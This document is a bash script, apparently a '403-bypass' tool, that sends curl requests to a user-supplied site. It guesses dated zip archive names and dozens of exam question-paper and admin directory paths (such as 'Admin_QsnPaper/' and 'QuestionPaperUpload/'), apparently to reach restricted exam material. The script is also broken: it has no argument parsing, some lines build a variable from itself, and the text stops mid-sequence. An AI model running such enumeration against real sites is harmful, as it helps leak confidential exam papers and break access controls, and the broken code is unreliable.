#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2\
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	echo -n "Payload [QP02_12_2023%2008_53_31.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_31.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_31.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_32.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_32.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_32.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_33.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_33.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_33.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
 echo -n "Payload ["QPBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ModuleQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ModuleQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoDataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoDataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQP/"" -H "User-Agent: Mozilla/5.0")
